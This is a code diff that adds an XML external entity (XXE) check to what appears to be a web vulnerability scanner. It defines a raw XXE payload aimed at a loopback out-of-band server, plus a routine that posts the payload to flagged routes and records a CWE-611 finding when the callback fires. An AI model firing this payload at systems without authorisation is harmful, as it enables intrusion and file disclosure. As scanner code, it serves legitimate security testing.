@@ -562,6 +562,29 @@ def _reflected_xss(routes, ctx):
                               "CWE-79", "A3:2021", severity="medium")
 
 
+# XML external entity: a document whose external entity points at our one-time loopback server. If the
+# parser resolves it, our server is hit (the OOB callback) — proof the entity was fetched. Loopback-only,
+# so it works air-gapped. {OOB_URL}/{OOB_MARKER} are substituted by the runner.
+_XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{OOB_URL}">]><r>&x;</r>'
+
+
+def _xxe(routes, ctx):
+    """XXE input is a whole XML document in the request BODY (not a named field), so send the payload raw
+    with an XML content-type and let the OOB callback confirm. Only fires where the route actually parses
+    XML and resolves external entities — no false positive. Targeted use (a flagged route), so it is in
+    _CLASS_FAMILY but not the blast-everything _FAMILIES."""
+    for r in routes:
+        method = r.method if r.method in ("POST", "PUT", "PATCH") else "POST"
+        ex = {"method": method, "path": _fill_path(r.path, {}),
+              "headers": {"Content-Type": "application/xml"}, "body": _XXE_PAYLOAD,
+              "oob": True, "success_if": {"oob_marker": "{OOB_MARKER}"},
+              "auth": ctx.auth, "login_as": "user" if r.auth_required else "none"}
+        hit, detail = run_exploit(ctx.base_url, ex)
+        if hit:
+            yield _finding("xxe", r, "CWE-611", "A05:2021",
+                           f"XML external entity resolved via the body of {method} {r.path}", ex, detail, "high")
+
+
 _FAMILIES = [_data_exposure, _injection, _bola, _bola_setup, _enumeration, _mass_assignment,
              _open_redirect, _ssrf, _command_injection, _path_traversal, _reflected_xss]
 
@@ -570,7 +593,7 @@ _FAMILIES = [_data_exposure, _injection, _bola, _bola_setup, _enumeration, _mass
 _CLASS_FAMILY = {
     "sql-injection": _injection, "nosql-injection": _injection, "injection": _injection,
     "xss": _reflected_xss, "command-injection": _command_injection, "path-traversal": _path_traversal,
-    "ssrf": _ssrf, "open-redirect": _open_redirect,
+    "ssrf": _ssrf, "open-redirect": _open_redirect, "xxe": _xxe,
 }
 
 
